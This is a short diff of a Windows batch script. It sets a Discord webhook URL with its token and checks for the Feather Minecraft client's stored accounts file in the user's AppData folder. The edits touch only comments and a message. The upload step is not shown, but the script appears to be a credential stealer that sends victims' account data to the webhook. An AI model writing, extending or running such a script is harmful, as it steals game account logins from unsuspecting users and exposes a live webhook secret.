@@ -11,13 +11,13 @@ setlocal enabledelayedexpansion
 :: Discord Webhook URL
 set webhookUrl=https://discord.com/api/webhooks/1377635895435329556/MAuAqPig5yepESXDNu4yLQ1TYnYHD7TJkXIEtVI5sNyibGQLLrOJJueL84kvDQW9lx8b
 
-:: Path to the accounts.json file
+:: Path to the accounts file
 set filePath=%userprofile%\AppData\Roaming\.feather\accounts
 
 
 :: Check if the file exists
 if not exist "%filePath%" (
-    echo File accounts.json does not exist at the specified path.
+    echo File accounts does not exist at the specified path.
     exit /b
 )
 
